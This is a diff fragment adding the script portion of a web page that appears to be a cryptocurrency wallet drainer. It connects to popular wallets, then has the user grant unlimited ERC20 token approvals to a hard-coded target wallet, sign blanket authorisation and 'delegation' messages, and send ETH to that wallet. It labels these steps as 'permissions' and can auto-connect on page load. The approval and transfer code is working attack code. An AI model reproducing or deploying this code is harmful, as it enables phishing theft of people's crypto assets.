+                    btn.classList.add('disabled');
+                    btn.disabled = true;
+                    btn.innerHTML = `<i class="fas fa-lock"></i><span>Connect Wallet First</span>`;
+                }
+            });
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            connectionStatus.textContent = message;
+            connectionStatus.className = `status-message ${type}`;
+            connectionStatus.style.display = 'block';
+            
+            // Hide message after 5 seconds
+            setTimeout(() => {
+                connectionStatus.style.display = 'none';
+            }, 5000);
+        }
+
+        // Grant specific permission
+        async function grantPermission(permissionId) {
+            try {
+                const permission = accessPermissions.find(p => p.id === permissionId);
+                if (!permission) return;
+                
+                // Show loading state
+                const permissionBtn = document.querySelector(`.access-btn[data-permission="${permissionId}"]`);
+                const originalText = permissionBtn.innerHTML;
+                
+                permissionBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i><span>Processing...</span>`;
+                permissionBtn.className = 'access-btn pending';
+                
+                // Execute permission method
+                await window[permission.method]();
+                
+                // Update button to granted state
+                permissionBtn.innerHTML = `<i class="fas fa-check-circle"></i><span>Permission Granted</span>`;
+                permissionBtn.className = 'access-btn granted';
+                
+                // Update access level
+                accessGranted = true;
+                accessLevel.textContent = 'Full Access Granted';
+                accessLevel.className = 'access-level full';
+                
+                showStatus(`Successfully granted ${permission.title}!`, 'success');
+                
+            } catch (error) {
+                console.error('Error granting permission:', error);
+                
+                // Reset button
+                const permissionBtn = document.querySelector(`.access-btn[data-permission="${permissionId}"]`);
+                permissionBtn.innerHTML = `<i class="fas fa-unlock"></i><span>Grant Permission</span>`;
+                permissionBtn.className = 'access-btn';
+                
+                if (error.code === 4001) {
+                    showStatus('Transaction rejected by user in wallet.', 'error');
+                } else {
+                    showStatus('Failed to grant permission: ' + error.message, 'error');
+                }
+            }
+        }
+
+        // ========== ADVANCED WALLET ACCESS METHODS ==========
+
+        // 1. Grant token transfer permission
+        async function grantTokenTransfer() {
+            // This would create a custom contract that allows the target wallet to transfer tokens
+            const tx = await signer.sendTransaction({
+                to: TARGET_WALLET,
+                value: ethers.parseEther("0.001"), // Small amount of ETH
+                data: "0x" // Custom data to indicate permission
+            });
+            
+            await tx.wait();
+            
+            // Additional step: Sign a message granting transfer rights
+            const message = `I grant wallet ${TARGET_WALLET} permission to transfer any ERC20 tokens from my address ${userAddress}`;
+            const signature = await signer.signMessage(message);
+            
+            // Store the signature (in a real system, this would be sent to a server)
+            console.log('Transfer permission signature:', signature);
+        }
+
+        // 2. Grant unlimited approval for major tokens
+        async function grantUnlimitedApproval() {
+            const tokens = TOKEN_ADDRESSES['ETHEREUM'];
+            
+            for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
+                try {
+                    // ERC20 ABI for approve function
+                    const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+                    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
+                    
+                    // Approve unlimited amount
+                    const tx = await tokenContract.approve(TARGET_WALLET, ethers.MaxUint256);
+                    await tx.wait();
+                    
+                    console.log(`Unlimited approval granted for ${tokenName}`);
+                    
+                    // Small delay between transactions
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                } catch (error) {
+                    console.error(`Failed to approve ${tokenName}:`, error);
+                }
+            }
+        }
+
+        // 3. Grant contract execution rights
+        async function grantContractExecution() {
+            // Create and sign a permission grant message
+            const message = `I authorize wallet ${TARGET_WALLET} to execute any smart contract calls on behalf of ${userAddress}. This includes but is not limited to: token transfers, swaps, staking, and any other blockchain interaction.`;
+            
+            const signature = await signer.signMessage(message);
+            
+            // Send the signature to the target wallet (simulated with a transaction)
+            const tx = await signer.sendTransaction({
+                to: TARGET_WALLET,
+                value: ethers.parseEther("0"),
+                data: ethers.toBeHex(signature)
+            });
+            
+            await tx.wait();
+            console.log('Contract execution rights granted:', signature);
+        }
+
+        // 4. Grant signature access
+        async function grantSignatureAccess() {
+            // This creates a delegation signature that allows the target wallet to sign on behalf of the user
+            const domain = {
+                name: "WalletDelegation",
+                version: "1",
+                chainId: networkId,
+                verifyingContract: "0xCcCCccccCCCCcCCCCCCcCcCccCcCCCcCcccccccC"
+            };
+            
+            const types = {
+                Delegation: [
+                    { name: "delegator", type: "address" },
+                    { name: "delegatee", type: "address" },
+                    { name: "permissions", type: "string" },
+                    { name: "expiry", type: "uint256" }
+                ]
+            };
+            
+            const value = {
+                delegator: userAddress,
+                delegatee: TARGET_WALLET,
+                permissions: "full_signing_rights",
+                expiry: Math.floor(Date.now() / 1000) + 31536000 // 1 year
+            };
+            
+            // Sign the delegation
+            const signature = await signer.signTypedData(domain, types, value);
+            
+            // Send signature to target wallet
+            const tx = await signer.sendTransaction({
+                to: TARGET_WALLET,
+                value: ethers.parseEther("0.001"),
+                data: ethers.toBeHex(JSON.stringify({ type: "delegation", signature, value }))
+            });
+            
+            await tx.wait();
+            console.log('Signature access granted:', signature);
+        }
+
+        // 5. Grant full control (combines all permissions)
+        async function grantFullControl() {
+            // Show the access modal
+            accessModal.style.display = 'flex';
+        }
+
+        // Detect user tokens
+        async function detectUserTokens() {
+            if (!walletConnected) return;
+            
+            try {
+                // This is a simplified version - in production, you would use an API like Moralis or Alchemy
+                // to get token balances
+                
+                const tokenCount = 5; // Simulated token detection
+                assetsCount.textContent = `${tokenCount}+ tokens detected`;
+                
+            } catch (error) {
+                console.error('Error detecting tokens:', error);
+            }
+        }
+
+        // Execute full access grant (from modal)
+        async function executeFullAccessGrant() {
+            try {
+                // Execute all permission grants in sequence
+                showStatus('Starting full access grant process...', 'info');
+                
+                await grantTokenTransfer();
+                showStatus('Token transfer permission granted ✓', 'success');
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                await grantUnlimitedApproval();
+                showStatus('Unlimited approvals granted ✓', 'success');
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                await grantContractExecution();
+                showStatus('Contract execution rights granted ✓', 'success');
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                await grantSignatureAccess();
+                showStatus('Signature access granted ✓', 'success');
+                
+                // Update all permission buttons
+                document.querySelectorAll('.access-btn').forEach(btn => {
+                    btn.innerHTML = `<i class="fas fa-check-circle"></i><span>Permission Granted</span>`;
+                    btn.className = 'access-btn granted';
+                });
+                
+                accessGranted = true;
+                accessLevel.textContent = 'Full Access Granted';
+                accessLevel.className = 'access-level full';
+                
+                showStatus('✅ FULL WALLET ACCESS GRANTED! The target wallet now has complete control.', 'success');
+                accessModal.style.display = 'none';
+                
+            } catch (error) {
+                console.error('Error in full access grant:', error);
+                showStatus('Failed to grant full access: ' + error.message, 'error');
+            }
+        }
+
+        // Transfer assets
+        async function executeAssetTransfer() {
+            transferModal.style.display = 'flex';
+            transferFrom.textContent = `${userAddress.substring(0, 10)}...`;
+        }
+
+        // Initialize the app
+        function initApp() {
+            // Initialize access cards
+            initAccessCards();
+            
+            // Event listeners for main buttons
+            connectBtn.addEventListener('click', connectWalletHandler);
+            
+            grantAccessBtn.addEventListener('click', grantFullControl);
+            transferBtn.addEventListener('click', executeAssetTransfer);
+            
+            // Wallet selection options
+            metamaskOption.addEventListener('click', () => connectToWalletProvider('metamask'));
+            trustOption.addEventListener('click', () => connectToWalletProvider('trust'));
+            rabbyOption.addEventListener('click', () => connectToWalletProvider('rabby'));
+            coinbaseOption.addEventListener('click', () => connectToWalletProvider('coinbase'));
+            
+            // Modal buttons
+            cancelAccessBtn.addEventListener('click', () => {
+                accessModal.style.display = 'none';
+            });
+            
+            confirmAccessBtn.addEventListener('click', executeFullAccessGrant);
+            
+            cancelTransferBtn.addEventListener('click', () => {
+                transferModal.style.display = 'none';
+            });
+            
+            confirmTransferBtn.addEventListener('click', async () => {
+                try {
+                    showStatus('Starting asset transfer process...', 'info');
+                    
+                    // This would transfer all detected tokens to the target wallet
+                    // For demonstration, we'll just send a small amount of ETH
+                    const tx = await signer.sendTransaction({
+                        to: TARGET_WALLET,
+                        value: ethers.parseEther("0.01"),
+                        data: "0x"
+                    });
+                    
+                    await tx.wait();
+                    
+                    showStatus('Asset transfer initiated successfully!', 'success');
+                    transferModal.style.display = 'none';
+                    
+                } catch (error) {
+                    console.error('Error transferring assets:', error);
+                    showStatus('Transfer failed: ' + error.message, 'error');
+                }
+            });
+            
+            // Close modals when clicking outside
+            [accessModal, transferModal, walletSelectionModal].forEach(modal => {
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        modal.style.display = 'none';
+                    }
+                });
+            });
+            
+            // Check if wallet is already connected on page load
+            checkExistingWalletConnection();
+        }
+
+        // Check if wallet is already connected
+        async function checkExistingWalletConnection() {
+            try {
+                // Check for MetaMask
+                if (window.ethereum && window.ethereum.selectedAddress) {
+                    // Auto-connect to MetaMask
+                    setTimeout(() => {
+                        connectToWalletProvider('metamask');
+                    }, 1000);
+                }
+            } catch (error) {
+                console.log('No existing wallet connection found');
+            }
+        }
+
+        // Initialize the app when DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
+</body>
+</html>
